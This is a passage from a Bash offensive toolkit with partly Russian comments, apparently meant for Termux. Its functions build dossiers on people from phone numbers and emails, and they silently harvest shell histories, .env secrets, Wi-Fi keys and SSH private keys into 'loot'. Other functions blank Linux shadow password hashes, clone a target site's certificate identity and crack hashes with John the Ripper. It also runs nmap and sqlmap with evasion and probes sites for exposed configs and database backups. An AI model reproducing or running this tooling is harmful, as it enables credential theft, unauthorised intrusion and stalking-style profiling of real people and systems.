    if [[ "$INPUT" =~ $GLOBAL_REGEX_PHONE ]]; then
        core_engine_ui "i" "Deep-Querying Global Phone Databases..."
        
        local active_phone_api="${GLOBAL_API_PHONE_NODES[0]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${active_phone_api}${INPUT}" >> "$raw_log" 2>/dev/null
        
        local phone_info=$(grep -oE '"name":"[^"]+"|"oper":"[^"]+"' "$raw_log" | sed 's/"//g')
        [[ -n "$phone_info" ]] && core_engine_ui "s" "Operator Data: $phone_info"
    fi

    # --- 3. DATA BREACH ANALYZER (Если ввод — email) ---
    if [[ "$INPUT" =~ $GLOBAL_REGEX_EMAIL ]]; then
        core_engine_ui "i" "Cross-referencing Leak Databases..."
        
        local active_breach_api="${GLOBAL_API_BREACH_NODES[0]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${active_breach_api}${INPUT}" >> "$raw_log" 2>/dev/null
        
        if grep -q "results" "$raw_log"; then
            core_engine_ui "w" "Breach Detected: Target found in global COMB leak."
            echo "[!] WARNING: Data leak detected for $INPUT" >> "$raw_log"
        fi
    fi

    # --- 4. NETWORK & IP ANALYZER (Если ввод — IP адрес) ---
    if [[ "$INPUT" =~ $GLOBAL_REGEX_IP ]]; then
        core_engine_ui "i" "Analyzing Network Infrastructure & GeoIP..."
        
        local active_net_api="${GLOBAL_API_NETWORK_NODES[0]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${active_net_api}${INPUT}/json" >> "$raw_log" 2>/dev/null
        
        local net_info=$(grep -oE '"org":"[^"]+"|"country_name":"[^"]+"|"city":"[^"]+"' "$raw_log" | sed 's/"//g')
        [[ -n "$net_info" ]] && core_engine_ui "s" "Network Route Found:\n$net_info"
    fi

    # --- 5. DOMAIN & DNS CORE (Если ввод — сайт или домен) ---
    if [[ "$INPUT" =~ $GLOBAL_REGEX_DOMAIN && ! "$INPUT" =~ $GLOBAL_REGEX_EMAIL ]]; then
        core_engine_ui "i" "Resolving Domain DNS Records & Whois Registry..."
        
        local active_dns_api="${GLOBAL_API_DOMAIN_NODES[2]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${active_dns_api}${INPUT}" >> "$raw_log" 2>/dev/null
        
        local active_whois_api="${GLOBAL_API_DOMAIN_NODES[3]%%|*}"
        curl -s -A "$GLOBAL_NETWORK_UA" "${active_whois_api}${INPUT}" >> "$raw_log" 2>/dev/null
    fi

    # --- 6. ГЕНЕРАЦИЯ ФИНАЛЬНОГО ДОСЬЕ ---
    core_engine_ui "line" ""
    core_engine_ui "s" "INTELLIGENCE DOSSIER GENERATED"
    core_engine_ui "line" ""
    
    local hits=$(grep -cE "FOUND|!|oper|org|country_name|login" "$raw_log" 2>/dev/null || echo 0)
    echo -e "${B}Target Identification:${NC} $INPUT"
    echo -e "${Y}Correlation Level:${NC} $hits matches found."
    
    echo -e "\n${G}--- DETAILED FINDINGS ---${NC}"
    if [ -f "$raw_log" ]; then
        grep -E "FOUND|oper|name|location|WARNING|org|country_name|city" "$raw_log" | sort -u
        if [[ "$INPUT" =~ $GLOBAL_REGEX_DOMAIN ]]; then
            head -n 15 "$raw_log" 2>/dev/null
        fi
    else
        echo -e "${R}No data collected.${NC}"
    fi
    
    core_engine_loot "osint" "Dossier for $INPUT created. Hits: $hits"
    rm -f "$raw_log"
    core_engine_ui "line" ""

    core_engine_wait
}



# ==============================================================================
# @description: Модуль форензики хоста и управления локальными учетными записями
# ==============================================================================
run_pc_recovery_ultimate() {
    clear
    # Слой 1: Заголовок через компоненты интерфейса Ядра
    core_engine_ui "h" "RECOVERY & FORENSIC ENGINE v3.0"

    # Слой 2: Органы чувств — Построение интерактивного меню
    core_engine_item "1" "Stealth Extract" "Prime_Extract v1.5 (Signatures Core)"
    core_engine_item "2" "Smart Password Reset" "Win/Lin/Mac Account Management"
    core_engine_item "B" "Back" "Return to Main Menu"
    core_engine_ui "line" ""

    local choice=$(core_engine_input "select" "Select Forensic Action")
    [[ -z "$choice" || "$choice" == "b" || "$choice" == "B" ]] && return

    case "$choice" in
        "1") # --- Слой Stealth Extract (Сбор системных артефактов) ---
            clear
            core_engine_ui "h" "FORENSICS: STEALTH ARTIFACT EXTRACTION"
            core_engine_ui "i" "Инициализация подсистем PRIME_EXTRACT..."
            
            core_engine_progress 2 "SCANNING SYSTEM ARTIFACTS"
            sleep 1
            
            # Временный буфер для аккумуляции собранных данных перед отправкой в loot
            local buffer=""
            
            # 1. Анализ истории команд терминалов (Bash/Zsh) через глобальные сигнатуры
            core_engine_ui "i" "Парсинг истории терминалов на учетные данные..."
            local hist=$(grep -hE "$GLOBAL_SIG_FORENSIC_HIST" /home/*/.{bash,zsh}_history 2>/dev/null)
            
            # 2. Поиск конфигурационных файлов и переменных окружения
            core_engine_ui "i" "Сканирование структуры директорий на секреты и .env..."
            local configs=$(find /home /var/www /etc -maxdepth 4 \( -name ".env" -o -name "config.php" -o -name "settings.py" \) 2>/dev/null | xargs grep -hE "$GLOBAL_SIG_FORENSIC_CONFIG" 2>/dev/null)

            # 3. Анализ Wi-Fi профилей (Доступы к беспроводным сетям)
            core_engine_ui "i" "Извлечение конфигураций беспроводных сетей..."
            local wifi=""
            [[ -d "/etc/NetworkManager/system-connections" ]] && wifi=$(grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null)

            # 4. Поиск приватных криптографических ключей SSH
            core_engine_ui "i" "Локация приватных SSH/PEM ключей..."
            local ssh_keys=$(find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null)

            # Слой 3: Структурирование и агрегация трофеев в хранилище Ядра
            buffer="Host: $(hostname)\nTimestamp: $(date)\n\n[--- HISTORY ARTIFACTS ---]\n$hist\n\n[--- CONFIG SECRET ARTIFACTS ---]\n$configs\n\n[--- WIFI CREDENTIALS ---]\n$wifi\n\n[--- SSH PRIVATE KEYS ---]\n$ssh_keys"
            
            # Экспорт в системную loot-директорию
            core_engine_loot "forensic" "$buffer"
            
            core_engine_ui "line" ""
            core_engine_ui "s" "Сбор артефактов успешно завершен. Следы LaZagne/Python отсутствуют."
            ;;

        "2") # --- Слой Smart Password Reset (Управление доступом) ---
            clear
            core_engine_ui "h" "ADMINISTRATION: PASSWORD RESET MATRIX"
            core_engine_ui "i" "Анализ целевой среды и структуры разделов..."
            
            # Поиск Windows SAM реестра на смонтированных накопителях
            local win_sam=$(find /mnt /media /run/media -type f -name "SAM" -path "*/System32/config/*" 2>/dev/null | head -n 1)
            
            if [[ -n "$win_sam" ]]; then
                core_engine_ui "w" "Обнаружена целевая база данных Windows SAM: $win_sam"
                # Проверка наличия и вызов утилиты обработки SAM-файлов
                core_engine_validator "pkg" "chntpw" "CHNTPW" && chntpw -i "$win_sam"
            else
                # Определение Unix-архитектуры на основе системных метрик Ядра
                local os_t="Linux"
                [[ "$(uname)" == "Darwin" ]] && os_t="macOS"
                core_engine_ui "i" "Идентифицирована операционная система: $os_t"

                local users=""
                if [[ "$os_t" == "macOS" ]]; then
                    # Парсинг локальных пользователей macOS через директорию служб
                    users=$(dscl . list /Users | grep -v '^_\|root')
                else
                    # Чистый парсинг реальных пользователей Linux (UID >= 1000) из /etc/passwd
                    users=$(awk -F: '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)
                fi
                
                if [[ -z "$users" ]]; then
                    core_engine_ui "e" "Локальные пользователи в системе не обнаружены."
                    core_engine_wait
                    return 1
                fi

                core_engine_ui "line" ""
                core_engine_ui "i" "Доступные учетные записи для модификации:"
                
                # Построение динамического меню на основе списка системных пользователей
                for u in $users; do 
                    core_engine_item "$u" "$u" "Локальный пользователь ОС"
                done
                core_engine_ui "line" ""
                
                local t_user=$(core_engine_input "select" "Выберите целевого пользователя")
                [[ -z "$t_user" || "$t_user" == "b" || "$t_user" == "B" ]] && return

                # Проверка, что выбранный пользователь действительно присутствует в списке
                if echo "$users" | grep -qxw "$t_user"; then
                    if [[ "$os_t" == "Linux" ]]; then
                        core_engine_ui "w" "Сброс пароля для пользователя $t_user (Очистка хэша shadow)..."
                        # Атомарная безопасная правка /etc/shadow через встроенный изолятор ядра
                        core_engine_run "sed -i 's/^$t_user:[^:]*:/$t_user::/' /etc/shadow" "Wiping Linux shadow password"
                        core_engine_ui "s" "Хэш shadow очищен. Вход для пользователя '$t_user' теперь открыт без пароля."
                        core_engine_loot "password_reset" "Сброшен пароль пользователя Linux: $t_user"
                    elif [[ "$os_t" == "macOS" ]]; then
                        local np=$(core_engine_input "text" "Введите новый пароль для учетной записи macOS")
                        if [[ -n "$np" ]]; then
                            core_engine_ui "w" "Перезапись пароля через dscl..."
                            core_engine_run "sudo dscl . -passwd /Users/$t_user $np" "Updating macOS password via DSCL"
                            core_engine_ui "s" "Пароль пользователя macOS '$t_user' успешно изменен."
                            core_engine_loot "password_reset" "Изменен пароль пользователя macOS: $t_user"
                        fi
                    fi
                else
                    core_engine_ui "e" "Ошибка: Указанный пользователь не найден в системной таблице."
                fi
            fi
            ;;
    esac

    core_engine_ui "line" ""
    core_engine_wait
}


run_crypto_forge() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME CRYPTO-FORGE & MIRROR v12.0"

    # Слой 2: Валидация OpenSSL через Мозг [5]
    core_engine_validator "pkg" "openssl" "OpenSSL Core" || { core_engine_wait; return; }

    # Слой 3: Органы чувств [3] — Прием цели
    local target=$(core_engine_input "text" "Enter Target (Domain, IP, File or 'new')")
    [[ -z "$target" ]] && return

    local tmp_data="/tmp/forge_$(date +%s).tmp"
    
    # --- СЛОЙ 4: ЭВРИСТИЧЕСКИЙ ЗАХВАТ (Analysis) ---
    core_engine_ui "i" "Ingesting cryptographic signals..."

    # Попытка захвата DNA через Глушитель [7]
    if [[ "$target" != "new" ]]; then
        { cat "$target" 2>/dev/null || \
          timeout 5 openssl s_client -connect "${target}:443" -servername "$target" </dev/null 2>/dev/null | openssl x509; \
        } > "$tmp_data" 2>/dev/null
    fi

    # --- СЛОЙ 5: АВТОМАТИЧЕСКИЙ ВЫБОР РЕЖИМА ---
    local mode="CREATE"
    [[ -s "$tmp_data" ]] && mode="MIRROR"
    core_engine_ui "s" "Mode Identified: $mode"

    local subj algo opt
    case "$mode" in
        "MIRROR")
            core_engine_ui "w" "Cloning target DNA for $target..."
            local cert_text=$(openssl x509 -in "$tmp_data" -text -noout)
            subj=$(echo "$cert_text" | grep "subject=" | sed 's/^subject= //; s/^subject=//')
            # Эвристика алгоритма
            if echo "$cert_text" | grep -qiE "RSA.*(2048|4096)"; then
                algo="rsa:2048"
                opt=""
            else
                algo="ec"
                opt="-pkeyopt ec_paramgen_curve:prime256v1"
            fi
            ;;
        "CREATE")
            core_engine_ui "i" "Initializing fresh identity Forge..."
            subj="/C=US/O=Prime_Intelligence/CN=${target:-prime.local}"
            algo="rsa:2048"
            opt=""
            ;;
    esac

    # --- СЛОЙ 6: ЕДИНАЯ КОВКА (Unified Forge) ---
    local loot_dir="${BASE_DIR:-./}/prime_loot"
    local safe_name=$(echo "$target" | tr '.' '_')
    local out_base="$loot_dir/${safe_name}_forge"
    
    # Генерация через Глушитель [7]
    if openssl req -x509 -newkey "$algo" $opt -nodes -days 365 \
        -subj "$subj" -keyout "${out_base}.key" -out "${out_base}.crt" 2>/dev/null; then
        
        # Стелс-зачистка через Санитара [8] (удаление меток инструмента)
        sed -i '/OpenSSL/d' "${out_base}.crt" 2>/dev/null
        
        core_engine_ui "+" "Cryptographic Artifact Synthesized."
        echo -e "${W}Key: ${out_base}.key\nCrt: ${out_base}.crt${NC}"
        
        # Сбор трофеев [11] и сигнал для Моста [10]
        core_engine_loot "crypto" "Generated $mode certificate for $target (Algo: $algo)"
        echo "[$(date)] CRYPTO_FORGE: $mode Success | Target: $target" >> "$loot_dir/bridge_signals.log"
    else
        core_engine_ui "e" "Forge rejected the sequence."
    fi

    # Очистка через Санитара [8]
    core_engine_remove "$tmp_data"
    core_engine_wait
}


run_pass_lab() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "PRIME PASSWORD LABORATORY v13.8"

    local target_hash="$1"
    local choice

    # Слой 2: Органы чувств [3] — Определение режима
    if [[ -z "$target_hash" ]]; then
        core_engine_item "1" "GENERATE" "Create Secure Password"
        core_engine_item "2" "CRUNCH" "Wordlist Generator"
        core_engine_item "3" "DECRYPT" "Hash Cracking"
        core_engine_item "B" "BACK" "Return"
        choice=$(core_engine_input "select" "Select Operation Mode")
    else
        # Если данные пришли из Bridge, сразу переходим к дешифровке
        choice="3"
        core_engine_ui "i" "Hash signal received from Bridge. Initializing Decryptor..."
    fi

    [[ -z "$choice" || "$choice" == "b" ]] && return

    case "$choice" in
        "1") # --- ВЕТКА GENERATE ---
            core_engine_item "1" "PHONETIC" "Easy to remember (pwgen)"
            core_engine_item "2" "COMPLEX" "Maximum entropy (urandom)"
            local g_mode=$(core_engine_input "select" "Generation Type")

            local len=$(core_engine_input "text" "Enter Length (Default: 16)")
            len=${len:-16}
            
            local pass=""
            if [[ "$g_mode" == "1" ]]; then
                # Проверка наличия pwgen через Мозг [5]
                core_engine_validator "pkg" "pwgen" "pwgen" && pass=$(pwgen -s "$len" 1)
            else
                pass=$(tr -dc 'A-Za-z0-9!@#$%^&*()_+=' < /dev/urandom | head -c "$len")
            fi

            core_engine_ui "+" "ARTIFACT GENERATED"
            echo -e "${W}Password: ${Y}$pass${NC}"
            
            # Мутация через Мозг [5]
            if core_engine_validator "read" "Apply Bcrypt mutation?"; then
                local b_hash=$(echo -n "$pass" | mkpasswd -m bcrypt -s 2>/dev/null || echo "Error: mkpasswd missing")
                echo -e "${G}Bcrypt Hash: ${NC}$b_hash"
                core_engine_loot "pass_gen" "Pass: $pass | Hash: $b_hash"
            fi
            ;;

        "2") # --- ВЕТКА CRUNCH ---
            # Валидация Crunch через Мозг [5]
            core_engine_validator "pkg" "crunch" "Crunch" || { core_engine_wait; return; }
            
            core_engine_ui "i" "Crunch Syntax: [min] [max] [charset]"
            local c_params=$(core_engine_input "text" "Enter Parameters (e.g., 4 6 abc12)")
            [[ -z "$c_params" ]] && return
            
            local out_file="${BASE_DIR:-./}/prime_loot/wordlist_$(date +%s).txt"
            core_engine_ui "w" "Generating wordlist to: $(basename "$out_file")"
            
            # Исполнение через Глушитель [7]
            core_engine_run "crunch $c_params -o $out_file" "Crunching Entropy"
            core_engine_ui "+" "Done. Signals saved to loot."
            ;;

        "3") # --- ВЕТКА DECRYPT (Интеграция с John) ---
            local hash_to_crack="${target_hash:-$(core_engine_input "text" "Enter Hash to Decrypt")}"
            [[ -z "$hash_to_crack" ]] && return
            
            core_engine_ui "!" "Initializing John the Ripper Engine..."
            # Сохраняем хеш во временный файл через Санитара [8]
            local tmp_h="/tmp/h_$(date +%s)"
            echo "$hash_to_crack" > "$tmp_h"
            
            # Проверка John через Мозг [5]
            if core_engine_validator "pkg" "john" "John the Ripper"; then
                core_engine_run "john $tmp_h" "Cracking Sequence"
                local result=$(john --show "$tmp_h" | head -n 1)
                
                core_engine_ui "+" "Cracking Cycle Finished."
                echo -e "${W}Result: ${Y}${result:-No match found}${NC}"
                
                [[ -n "$result" ]] && core_engine_loot "cracked_hashes" "Hash: $hash_to_crack | Result: $result"
            fi
            core_engine_remove "$tmp_h"
            ;;
    esac

    core_engine_wait
}


# ==============================================================================
# @description: Эвристический сканер уязвимостей (GHOST-ENGINE INTEG v7.2)
# ==============================================================================
run_prime_exploiter_v5() {
    clear
    # Слой 1: Заголовок ядра
    core_engine_ui "h" "PRIME HEURISTIC VULN-SCANNER v7.2"

    # Слой 2: Прием цели
    local target=$(core_engine_input "text" "Enter Target Domain/URL")
    [[ -z "$target" ]] && return

    # Подготовка путей согласно архитектуре ядра
    local loot_dir="$BASE_DIR/loot"
    mkdir -p "$loot_dir"
    local results_file="$loot_dir/vuln_$(date +%s).log"
    local signals_file="/tmp/signals_$RANDOM.tmp"

    # --- СЛОЙ 1: ПАССИВНЫЙ ГЕНЕРАТОР СИГНАЛОВ ---
    core_engine_ui "i" "Ingesting target aura (Passive Mode)..."

    # Сбор данных с использованием глобального User-Agent ядра
    {
        curl -Is --connect-timeout 5 -A "$GLOBAL_NETWORK_UA" "$target"
        host -t txt "$target" 2>/dev/null
        whois "$target" 2>/dev/null | grep -iE "city|country|orgname"
    } > "$signals_file" 2>&1

    # --- СЛОЙ 2: АДАПТИВНАЯ МАТРИЦА (Мозг системы) ---
    local entropy_level=$(wc -c < "$signals_file")
    local stealth_delay=$(( (entropy_level % 5) + 2 ))

    # Эвристический выбор модулей на основе глобальных сигнатур веб-структуры
    local sql_engine="dormant"
    grep -qiE "$GLOBAL_SIG_WEB_STRUCTURE" "$signals_file" && sql_engine="active"

    # Адаптивное управление интенсивностью при обнаружении WAF через глобальные сигнатуры
    local scan_intensity="-T3"
    grep -qiE "$GLOBAL_SIG_WAF" "$signals_file" && scan_intensity="-T1 --spoof-mac 0"

    # --- СЛОЙ 3: ЦИКЛ АМОРФНОГО ИСПОЛНЕНИЯ ---
    core_engine_ui "w" "Deploying Ghost-Engine (Intensity: $scan_intensity)..."

    # Запуск параллельного фонового процесса сбора артефактов
    (
        nmap $scan_intensity -n -Pn --version-intensity 0 "$target" >> "$results_file" 2>&1

        if [[ "$sql_engine" == "active" ]]; then
            # Адаптивный вызов sqlmap с автоматическими параметрами безопасности
            sqlmap -u "$target" --batch --random-agent --delay="$stealth_delay" \
                  --threads=1 >> "$results_file" 2>&1
        fi
    ) &

    # Визуализация прогресса
    core_engine_progress 10 "Processing heuristic feedback loops"

    # --- СЛОЙ 4: ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ ---
    core_engine_wait "L"
    core_engine_ui "s" "INTELLIGENCE SYNTHESIS COMPLETE"

    # Парсинг результатов через Валидатор с использованием глобальных алертов уязвимостей
    if [[ -s "$results_file" ]]; then
        grep -Ei "$GLOBAL_SIG_VULN_ALERTS" "$results_file" | \
        sed -r "s/(.*vulnerable.*)/\1 ${Y}[HIGH PRIORITY]${NC}/" | sort -u

        # Интеграция в Сборщик трофеев ядра
        core_engine_loot "vulnerabilities" "Target: $target | Entropy: $entropy_level\n$(cat "$results_file")"
    else
        core_engine_ui "e" "No significant anomalies detected in initial scan."
    fi

    # Сигнал для Моста логов
    echo "[$(date)] VULN_SCAN: $target | ENTROPY: $entropy_level" >> "$loot_dir/bridge_signals.log"

    # Очистка временных файлов через Санитара
    rm -f "$signals_file"
    core_engine_wait
}



# ==============================================================================
# @description: Единый конвейер автоматической корреляции, сборки и экспорта
# ==============================================================================
run_nexus_full_pipeline() {
    core_engine_ui "h" "NEXUS CORRELATION: FULL PIPELINE AUTOMATION"
    
    # 1. Захват и верификация цели
    local current_target="${target_user:-"general_target"}"
    core_engine_ui "i" "Инициализация сквозного анализа для объекта: [$current_target]"
    echo "------------------------------------------------------------------"

    local timestamp
    timestamp=$(date +'%Y%m%d_%H%M')
    
    # Пути для сохранения артефактов
    local prime_loot_dir="$HOME/prime_loot"
    local archive_dir="$prime_loot_dir/archives"
    local target_report="$prime_loot_dir/nexus_report_${current_target}_${timestamp}.md"
    local archive_file="$archive_dir/loot_${current_target}_${timestamp}.tar.gz"
    local export_path="/sdcard/Download"

    mkdir -p "$prime_loot_dir" "$archive_dir"

    # ==========================================
    # ЭТАП 1: ARTIFACT LINKER (Глубокая линковка)
    # ==========================================
    core_engine_ui "i" "[Этап 1/4] Сшивание логов и построение паспорта объекта..."
    
    echo "==================================================================" > "$target_report"
    echo "  NEXUS INTEGRATED INTELLIGENCE REPORT: $current_target" >> "$target_report"
    echo "  GENERATED: $(date +'%Y-%m-%d %H:%M:%S')" >> "$target_report"
    echo "==================================================================" >> "$target_report"

    if ls "$prime_loot_dir"/*"${current_target}"* 1>/dev/null 2>&1; then
        find "$prime_loot_dir" -type f -name "*${current_target}*" | while read -r file; do
            if [[ "$file" != *"/nexus_report_"* && "$file" != *"/archives/"* ]]; then
                echo -e "\n### АНАЛИЗ ИСТОЧНИКА: $(basename "$file")" >> "$target_report"
                echo "--------------------------------------------------" >> "$target_report"
                while read -r line; do
                    if [[ -n "$line" ]]; then
                        echo "  * $line" >> "$target_report"
                    fi
                done < "$file"
            fi
        done
        core_engine_ui "s" "[+] Сводный цифровой профиль успешно сгенерирован."
    else
        core_engine_ui "w" "[!] Первичные логи отсутствуют. Создан пустой бланк отчета."
        echo "[-] Локальные сырые логи для построения профиля отсутствуют." >> "$target_report"
    fi

    # ==========================================
    # ЭТАП 2: KNOWLEDGE GRAPH (Топология связей)
    # ==========================================
    echo "------------------------------------------------------------------"
    core_engine_ui "i" "[Этап 2/4] Визуализация семантической карты..."
    
    echo "  [ ТОПОЛОГИЯ ЦИФРОВОГО СЛЕДА ОБЪЕКТА: $current_target ]"
    echo "                      "
    echo "       [Instagram] <--- (Профиль) ---+ "
    echo "                                      | "
    echo "       [TikTok]    <--- (Медиа) -----+---> [ $current_target ]"
    echo "                                      | "
    echo "       [Telegram]  <--- (Связь) -----+ "
    echo "                                      | "
    echo "       [Reddit]    <--- (Форумы) ----+ "
    echo "                      "

    # Вывод критических зацепок на экран (Безопасный grep фиксированных строк)
    if [[ -f "$target_report" ]]; then
        grep -F "->" "$target_report" 2>/dev/null | head -n 10 | while read -r match_line; do
            local clean_display
            clean_display=$(echo "$match_line" | tr -d '*#')
            echo "     [!] ВЫЯВЛЕНА СВЯЗЬ: $clean_display"
        done
    fi

    # ==========================================
    # ЭТАП 3: LOOT COLLECTOR (Архивация)
    # ==========================================
    echo "------------------------------------------------------------------"
    core_engine_ui "i" "[Этап 3/4] Компрессия данных в защищенный архив..."
    
    if ls "$prime_loot_dir"/*"${current_target}"* 1>/dev/null 2>&1; then
        (cd "$prime_loot_dir" && tar -czf "$archive_file" --exclude='archives' *"${current_target}"* 2>/dev/null)
        core_engine_ui "s" "[+] Все файлы упакованы в: $(basename "$archive_file")"
    else
        core_engine_ui "w" "[!] Нет файлов для компрессии."
    fi

    # ==========================================
    # ЭТАП 4: SESSION EXPORT (Выгрузка на накопитель)
    # ==========================================
    echo "------------------------------------------------------------------"
    core_engine_ui "i" "[Этап 4/4] Автоматический экспорт на внешний накопитель..."
    
    if [[ -d "$export_path" ]]; then
        if cp "$target_report" "$export_path/" 2>/dev/null && cp "$archive_file" "$export_path/" 2>/dev/null; then
            core_engine_ui "s" "[УСПЕХ] Все отчеты и архивы скопированы в: $export_path/"
        else
            # Если нет прав доступа к sdcard памяти смартфона
            local backup_export="$HOME/nexus_export"
            mkdir -p "$backup_export"
            cp "$target_report" "$backup_export/" 2>/dev/null
            cp "$archive_file" "$backup_export/" 2>/dev/null
            core_engine_ui "w" "[!] Ограничение прав Termux. Файлы выгружены локально: $backup_export/"
        fi
    else
        core_engine_ui "e" "[-] Внешний каталог $export_path не найден. Результаты сохранены в $prime_loot_dir"
    fi

    echo "------------------------------------------------------------------"
    core_engine_ui "s" "Конвейер полностью завершен! Сессия зафиксирована."
    core_engine_wait
}



# --- PRIME OMEGA AUDITOR v2.5 [GHOST_SPEED] ---
# --- ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ГЛУБОКОГО АНАЛИЗА ---
run_deep_file_probe() {
    local host="$1"
    local target_file="$2"
    [[ -z "$host" || -z "$target_file" ]] && return

    core_engine_ui "i" "Deep Probing: $target_file..."
    
    # Загружаем заголовок файла (первые 2кб достаточно для анализа логики)
    local sample=$(curl -s -k -L --max-time 5 "https://$host/$target_file" | head -c 2048)
    local leaks=""

    # Эвристика: поиск паттернов уязвимостей
    echo "$sample" | grep -qiE "mysqli_connect|PDO\(|db_password|db_user|root" && leaks+="${R}[!] DB_LEAK: Connection string detected${NC}\n"
    echo "$sample" | grep -qiE "POST\[|GET\[|REQUEST\[" && leaks+="${Y}[*] LOGIC: Entry point for data detected${NC}\n"
    echo "$sample" | grep -qiE "exec\(|system\(|passthru\(" && leaks+="${R}[!] RCE_RISK: System command execution${NC}\n"
    echo "$sample" | grep -qiE "fopen\(|file_get_contents\(" && leaks+="${B}[i] LFI_RISK: File operations detected${NC}\n"

    if [[ -n "$leaks" ]]; then
        echo -e "      |--- ANALYSIS:\n$(echo -e "$leaks" | sed 's/^/      | /')"
        # Сохраняем "грязный" файл в лут для ручного разбора
        echo "$sample" > "$PRIME_LOOT/probe_${target_file//\//_}_$(date +%s).php"
    fi
}

# --- ОСНОВНОЙ АУДИТОР ---
run_prime_auditor_v2() {
    local host="$1"
    core_engine_ui "h" "OMEGA AUDITOR v5.1 (Deep Probe / Parallel)"

    # 1. ПОЛУЧЕНИЕ ЦЕЛИ
    if [[ -z "$host" ]]; then
        host=$(core_engine_input "text" "Enter Target (Domain or IP)")
    fi
    [[ -z "$host" ]] && return

    # 2. ЭВРИСТИКА БЕЗОПАСНОСТИ
    if [[ "$host" =~ ^(127\.|192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|localhost) ]]; then
        core_engine_ui "i" "Local target detected. Skipping Anonymity Check."
    else
        core_engine_validator "privacy" "" "Security Shield" || return
    fi

    # 3. ВАЛИДАЦИЯ
    core_engine_validator "url" "$host" "Syntax" || return
    core_engine_validator "net_up" "$host" "Availability" || return

    # 4. ПАРАЛЛЕЛЬНЫЙ ДВИЖОК
    local tmp_pipe="/tmp/prime_pipe_$$"
    local vuln_links=""
    touch "$tmp_pipe"

    core_engine_ui "i" "Deploying Parallel Engines on: $host"

    ( # Поток А: Краулинг контента
        local discovered=$(curl -s -k -L --max-time 5 "https://$host" | grep -oE '[a-zA-Z0-9_\/\.-]+\.(php|pdf|docx|xlsx|zip|sql|env|htaccess)' | sort -u)
        for t in $discovered; do echo "HIT|$t" >> "$tmp_pipe"; done
    ) &

    ( # Поток Б: Скрытые директории/файлы
        local fuzz=(".env" ".htaccess" "backup.sql" "config.php.bak" ".git/config" "phpinfo.php" "wp-config.php" "config.php")
        for f in "${fuzz[@]}"; do
            local res=$(curl -s -k -L -I -w "%{http_code}" -o /dev/null --connect-timeout 3 "https://$host/$f")
            [[ "$res" == "200" ]] && echo "HIT|$f" >> "$tmp_pipe"
        done
    ) &

    wait
    
    # 5. ИНТЕЛЛЕКТУАЛЬНЫЙ ЛУТИНГ + DEEP PROBE
    core_engine_ui "line"
    echo -e "${Y}>>> AUDIT REPORT: $host <<<${NC}"

    while IFS='|' read -r type target; do
        # Быстрая проверка на мусор хостинга
        local head_check=$(curl -s -k -L --max-time 3 "https://$host/$target" | head -c 500)
        if ! echo "$head_check" | grep -qiE "<html>|403 Forbidden|InfinityFree|Not Found"; then
            
            # Классификация
            if echo "$target" | grep -qiE "\.(env|sql|bak|htaccess)"; then
                core_engine_loot "CRITICAL" "Exposed: $target on $host"
                echo -e "${R}[CRITICAL]${NC} $target"
            else
                echo -e "${G}[FILE]${NC} $target"
            fi

            # --- ЭВРИСТИЧЕСКИЙ ВЫЗОВ DEEP PROBE ---
            # Если файл PHP и имеет подозрительное имя — вскрываем немедленно
            if echo "$target" | grep -qiE "\.php$" && echo "$target" | grep -qiE "log|pass|recup|config|admin|db|setup"; then
                run_deep_file_probe "$host" "$target"
            fi
        fi
    done < <(sort -u "$tmp_pipe")

    rm -f "$tmp_pipe"
    core_engine_ui "line"
    core_engine_wait
}

run_omni_scan() {
    core_engine_ui "h" "OMNI-SCAN ENGINE v1.0 (Autonomous Orchestrator)"

    # Слой 1: Безопасность
    core_engine_validator "privacy" "" "Anonymity Check" || return

    # Слой 2: Ввод
    local target_host=$(core_engine_input "text" "Enter Target Host")
    [[ -z "$target_host" ]] && return

    # Слой 3: Предварительная проверка
    core_engine_validator "url" "$target_host" "Syntax Check" || return
    core_engine_validator "net_up" "$target_host" "Availability Check" || return

    core_engine_ui "i" "All checks passed. Deploying Parallel Auditor..."
    
    # ПЕРЕДАЧА ХОСТА В АУДИТОР
    run_prime_auditor_v2 "$target_host"
}



run_view_loot() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "DATA HARVESTER: INTELLIGENT LOOT VIEW"

    # Слой 2: Органы чувств [3] — Определение путей
    local base_loot="${BASE_DIR:-./}/prime_loot"
    
    # Поиск артефактов через Санитара [8]
    local found_files=$(find "$base_loot" -maxdepth 1 -type f -size +1c 2>/dev/null)
    local found_count=0

    if [[ -n "$found_files" ]]; then
        for file in $found_files; do
            ((found_count++))
            
            # Слой 3: Аналитика и визуализация
            core_engine_ui "s" "ANALYZING ARTEFACT: $(basename "$file")"
            echo -e "${D}--------------------------------------------------${NC}"
            
            # Интеллектуальный парсинг контента через Глушитель [7]:
            # 1. IP-адреса -> Циан (C)
            # 2. Password/Key -> Желтый (Y)
            # 3. Payload/Success -> Зеленый (G)
            
            tail -n 30 "$file" | sed \
                -e "s/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}/${C}&${NC}/g" \
                -e "s/Password[:=]\(.*\)/${Y}&${NC}/g" \
                -e "s/BRUTE_SUCCESS\(.*\)/${G}&${NC}/g" \
                -e "s/EXPLOIT_SUCCESS\(.*\)/${G}&${NC}/g" \
                -e "s/Payload[:=]\(.*\)/${G}&${NC}/g"
            
            echo -e "\n${D}--------------------------------------------------${NC}"
        done
    else
        core_engine_ui "e" "No data found in $base_loot"
    fi

    # Слой 4: Синхронизация [13]
    core_engine_wait
}

run_iban_analyzer() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "FINANCIAL INTELLIGENCE: OMNI-BANKER v2.2"

    # Слой 2: Валидация фундамента через Мозг [5]
    core_engine_validator "pkg" "python3" "Python3 Engine" || { core_engine_wait; return; }

    # Слой 3: Органы чувств [3] — Выбор вектора
    core_engine_item "1" "SINGLE" "Full IBAN & Holder Analysis"
    core_engine_item "2" "PASSIVE" "Structural Validation Only"
